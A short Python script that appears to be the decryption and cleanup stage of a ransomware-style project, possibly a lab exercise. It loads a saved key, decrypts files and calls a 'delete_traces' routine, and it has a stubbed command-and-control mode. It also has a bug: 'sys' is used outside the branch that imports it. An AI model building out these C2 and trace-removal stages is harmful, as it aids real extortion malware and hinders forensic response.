
if __name__ == "__main__":
    # key = load_key()
    # fernet = Fernet(key)
    # decrypt_file("mock files/a.txt", "mock files/a.txt", fernet)
    import os
    import platform 
    import json

    system = platform.system()
    base = os.path.dirname(os.path.realpath(__file__))

    # since windows does not support syslink we need to change the working directory
    if system == "Windows":
        import sys
        cwd = os.getcwd()
        #added_line_script
        os.chdir(cwd)
        sys.path.append(cwd)
        base = cwd

    path = os.path.join(base, "discovered_info.json")

    with open(path, "r") as conf_file:
        data = json.load(conf_file)


    # TODO: handle c2 mode
    if data["mode"] == "c2":
        # Send Decryption request to C2.
        # A good way to identify the system is to create a unique identifier 
        # This unique identifier is handler by the server and sent when authenticated
        # Use that to understand requests.
        pass 


    import importlib
    try:
        importlib.import_module("cryptography")
    except ImportError:
        import subprocess
        subprocess.run([sys.executable, '-m', 'pip', 'install', "--user",'cryptography'])
    from main import Program

    program = Program(data=data, mode="auto", system=platform.system())
    program.load_key(base + "/secret.key")
    program.decrypt()
    program.delete_traces()
